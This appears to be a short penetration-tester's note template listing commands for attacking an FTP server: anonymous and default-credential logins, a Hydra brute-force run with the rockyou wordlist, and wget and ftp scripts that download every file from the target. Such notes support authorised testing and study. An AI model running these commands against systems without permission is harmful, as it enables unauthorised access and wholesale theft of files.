# FTP
## Anonymous login
```bash
ftp ftp://anonymous:anonymous@<% tp.frontmatter.target_ip %>
```

## user/password guesses
```bash
ftp ftp://admin:password@<% tp.frontmatter.target_ip %>
```

```bash
ftp ftp://admin:password@<% tp.frontmatter.target_ip %>
```

**If you have a username, try there username as the password**

## Brute force user
**If you have a username**
```bash
hydra -l <user> -P /usr/share/wordlists/rockyou.txt ftp://<% tp.frontmatter.target_ip %>
```

## Download EVERYTHING

```bash
wget -m --user=username --password=password ftp://<% tp.frontmatter.target_ip %>
```

**Script of you don't want to use wget**
```bash
#! /bin/bash

ftp -n << 'EOF'
open <% tp.frontmatter.target_ip %>
quote USER your_username_here
quote PASS your_password_here
prompt no
mget * .
bye
EOF
```
